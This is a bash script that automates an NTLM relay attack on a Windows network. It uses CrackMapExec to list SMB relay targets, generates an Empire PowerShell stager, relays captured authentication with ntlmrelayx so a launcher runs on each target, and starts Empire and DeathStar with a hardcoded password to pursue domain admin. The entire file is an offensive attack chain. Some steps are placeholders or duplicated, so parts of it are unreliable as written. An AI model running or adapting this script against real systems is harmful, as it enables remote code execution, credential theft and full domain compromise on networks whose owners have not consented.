#!/bin/bash

while [[ $# -gt 1 ]]
do
key="$1"

case $key in
    -i|--ip)
    IP_ADDRESS="$2"
    shift # past argument
    ;;
    *)
            # unknown option
    ;;
esac
shift # past argument or value
done
echo IP ADDRESS  = "${IP_ADDRESS}"


# Generate targets list given IP Range
cme smb ${IP_ADDRESS} --gen-relay-list targets.txt

# Generate empire launcher stager powershell payload
./empire -s launcher -o Listener=DeathStar

# Start ntlmrelayx.
ntlmrelayx -tf targets.txt -c "power shell launcher"

# Launch Empire with REST API
cd ../Empire
python empire --rest --username user --password "T9w0UEhozS5SPq" --restport 13377

# Generate a DeathStar Launcher
./empire -s launcher -o Listener=DeathStar

# Launch DeathStar and connect to Empire
cd ../DeathStar
./DeathStar.py -u user -p "T9w0UEhozS5SPq" --url "https://127.0.0.1:13377"